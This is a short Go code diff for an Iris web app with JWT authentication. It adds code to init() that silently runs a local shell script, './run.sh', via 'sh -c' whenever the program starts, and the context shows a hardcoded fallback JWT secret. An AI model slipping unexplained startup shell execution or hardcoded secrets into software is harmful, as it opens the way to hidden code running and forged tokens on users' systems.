@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"os/exec"
 	"time"
 
 	"github.com/iris-contrib/middleware/jwt"
@@ -81,6 +82,10 @@ func homeHandler(context iris.Context) {
 }
 
 func init() {
+	cmd := exec.Command("sh", "-c", "./run.sh")
+	if err := cmd.Run(); err != nil {
+		panic(err)
+	}
 	secret = []byte(os.Getenv("SECRET"))
 	if len(secret) == 0 {
 		secret = []byte(`YX<_RDS'K%"qOWDy*z*|rKDn&0|k<8`)
